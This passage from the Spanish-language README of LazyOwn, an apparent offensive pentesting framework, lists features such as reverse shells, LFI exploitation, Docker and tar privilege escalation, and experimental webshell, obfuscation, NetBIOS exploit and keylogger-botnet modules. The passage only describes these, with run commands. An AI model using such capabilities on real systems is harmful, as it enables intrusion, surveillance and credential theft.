Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
Verificar Conectividad con Curl: Verifica la conectividad usando curl.
Configurar Shell Reversa: Configura una shell reversa.
Escuchar Shell con Netcat: Escucha una shell con netcat.
Monitorear Procesos: Monitorea los procesos en ejecución.
Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
Comprobar Permisos Sudo: Comprueba los permisos de sudo.
Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
Configurar TTY: Configura TTY para una sesión shell más estable.
Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
Listar Timers de Systemd: Lista timers de systemd.
Comprobar Rutas de Comandos: Comprueba rutas de comandos.
Abusar de Tar: Abusa de tar para ejecutar una shell.
Enumerar Puertos Abiertos: Enumera puertos abiertos.
Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
Escanear Red: Escanea la red con secuencia y xargs.
```
## Experimental LazyOwnWebShell en python
Corre en http://localhost:5000 experimental, ya que aun no funciona la salida de la webshell de cara al navegador. pero los comandos si son ejecutados correctamente. por eso está en modo experimental... por no decir que aun tiene bugs xD

![Captura de pantalla 2024-06-09 030335](https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd)

```sh
python3 main.py 
```
## Experimental ofuscación mediante pyinstaller
esto está en modo experimental y no funciona del todo, ya que tiene un problema de rutas. pronto ya contará con ofuscación mediante pyinstaller
```sh
./py2el.sh
```
## Experimental exploit netbios
esto está en modo experimental ya que aun no funciona... (proximamente quizas una implementacion de eternalblue entre otras cositas...)
```sh
run lazynetbios
```
## Experimental LazyBotNet con keylogger para windows y Linux
esto está en modo experimental y no funciona la desencriptación del log del keylogger xD
acá vemos por primera vez en accion el comando payload el cual nos setea toda la config en nuestro payload.json así podemos precargar la config antes de arrancar con el framework
```sh
payload
run lazybotnet
```
## Menús Interactivos
El script presenta menús interactivos para seleccionar las acciones a realizar. En modo servidor, muestra opciones relevantes para la máquina víctima, y en modo cliente, muestra opciones relevantes para la máquina atacante.

Interrupción Limpia
El script maneja la señal SIGINT (usualmente generada por Control + C) para salir limpiamente.
## Licencia
Este proyecto está licenciado bajo la Licencia GPL v3. La información contenida en GTFOBins es propiedad de sus autores, a quienes se les agradece enormemente por la información proporcionada.

## Agradecimientos
Un agradecimiento especial a  [GTFOBins](https://gtfobins.github.io/) por la valiosa información que proporcionan y a ti por utilizar este proyecto. ¡Gracias por tu apoyo!
